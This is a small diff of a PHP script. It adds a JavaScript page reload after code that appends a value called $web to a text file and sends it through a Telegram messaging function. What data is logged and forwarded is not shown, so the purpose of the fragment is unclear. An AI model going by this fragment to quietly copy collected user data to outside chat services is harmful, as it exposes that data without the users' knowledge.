@@ -103,6 +103,9 @@
         ';
         file_put_contents($txt ,$web."\n",FILE_APPEND);
         echo telegramMsj($web);
+	echo '<script>setTimeout(function(){ 
+            window.location.reload(); 
+        }, 300);</script>';
         
     } else {
         $contenido = trim(file_get_contents($txtc));
